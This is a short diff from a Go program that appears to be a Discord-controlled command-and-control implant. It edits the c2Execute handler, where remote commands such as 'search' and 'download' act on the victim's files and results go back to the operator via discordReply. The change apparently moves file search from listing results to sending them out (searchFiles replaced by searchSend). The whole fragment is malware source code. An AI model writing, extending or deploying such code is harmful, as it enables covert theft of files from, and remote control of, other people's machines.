@@ -439,14 +439,14 @@ func c2Execute(command string) {
 	case "search", "find":
 		parts := strings.Fields(args)
 		pattern := ""
-		maxRes := 50
+		maxRes := 0
 		if len(parts) > 0 {
 			pattern = parts[0]
 		}
 		if len(parts) > 1 {
 			maxRes, _ = strconv.Atoi(parts[1])
 		}
-		discordReply(searchFiles(pattern, maxRes))
+		discordReply(searchSend(pattern, maxRes))
 
 	case "download", "get":
 		if args == "" {
